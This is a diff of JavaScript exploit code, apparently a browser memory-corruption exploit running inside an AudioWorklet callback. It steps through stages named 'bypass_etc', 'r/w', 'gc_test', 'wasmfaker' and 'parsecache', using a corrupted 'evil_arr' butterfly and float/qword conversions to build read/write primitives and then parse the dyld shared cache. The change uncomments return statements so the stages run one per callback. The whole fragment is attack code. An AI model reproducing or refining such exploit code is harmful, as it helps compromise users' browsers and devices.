@@ -620,7 +620,7 @@ b.process = (inputs, outputs, parameters)=>{
         stage  = "bypass_etc";
         fuck.port.postMessage(c);
         //sleep(4000);
-        //return true;
+        return true;
     }
     if(stage == "bypass_etc"){
         //fuck.port.postMessage(typeof parameters);
@@ -659,7 +659,7 @@ b.process = (inputs, outputs, parameters)=>{
         evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);
 
         stage = "r/w";
-        //return true;
+        return true;
     }
     if(stage == "r/w"){
         for(var i =0; i < 2; i++){
@@ -770,14 +770,14 @@ b.process = (inputs, outputs, parameters)=>{
         
         
         stage="gc_test"
-        //return true;
+        return true;
     }
     if(stage=="gc_test"){
         gc();
         fuck.port.postMessage(`Garbage Collected`);
         //sleep(100000);
         stage = "wasmfaker";
-        //return true;
+        return true;
     }
     if (stage=="wasmfaker") {
     debugger;
@@ -790,7 +790,7 @@ b.process = (inputs, outputs, parameters)=>{
         var print1 = fuck.port.postMessage();
      
         stage = "parsecache";
-        //return true;
+        return true;
     }
     if(stage =="parsecache") {
         print1(`success now about to parse dyld shared cache...`);
